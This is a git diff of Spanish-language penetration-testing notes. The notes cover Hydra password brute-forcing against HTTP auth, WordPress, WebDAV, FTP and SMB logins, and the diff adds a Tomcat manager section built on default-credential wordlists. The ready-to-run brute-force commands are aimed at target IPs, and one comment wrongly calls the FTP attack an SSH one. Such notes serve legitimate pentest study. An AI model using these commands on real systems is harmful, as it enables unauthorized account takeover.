@@ -36,7 +36,7 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /DIR/ 
 
 	# IP = Direccion IP del servidor que contiene la autenticacion que solicita user/passwd para acceder a la pagina
-	# DIR = Directorio que contiene la autenticacion 
+	# DIR = Ruta que contiene la autenticacion 
 ```
 
 ## Fuerza bruta a un CMS
@@ -54,8 +54,9 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 
 ## Hydra fuerza bruta WordPress
 
-Esto se usa en el panel del admin de WordPress.
 ```python
+# Esto se usa en el panel del admin de WordPress
+
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' 
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid user'
 
@@ -71,8 +72,6 @@ Esto se usa en el panel del admin de WordPress.
 	# F = Error que nos muestre el panel de autenticacion, por si no sirve con el 'S'
 ```
 
-![](Pasted%20image%2020240329162024.png)
-
 ## Hydra fuerza bruta WebDAV
 
 ```python 
@@ -83,7 +82,19 @@ Esto se usa en el panel del admin de WordPress.
 	# P = Ruta del diccionario o 'archivo que contiene passwds'
 ```
 
+## Tomcat 
+
+```bash 
+❯ hydra -l tomcat -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt <IP> -s 8080 http-get /manager/html/ 
+
+	# s = Indicar el puerto 8080
+	# L = /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
+	# IP = Direccion IP del servidor que contiene la autenticacion que solicita user/passwd para acceder a la pagina
+	# http-get = Ruta que contiene el panel de autenticacion '/manager/html/ o /host-manager/html' 
+```
+
 ## Hydra fuerza bruta FTP
+
 ```python
 ❯ hydra -l omar -P /usr/share/wordlists/rockyou.txt ftp://❮IP❯ -t 15 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios
 
@@ -130,6 +141,7 @@ Esto se usa en el panel del admin de WordPress.
 ```
 
 ## Hydra fuerza bruta SMB / SAMBA
+
 ```python 
 # Si esta  la version 'SMBv1', no podremos usar esta herramienta para Fuerza Bruta, solo con Metasploit
 
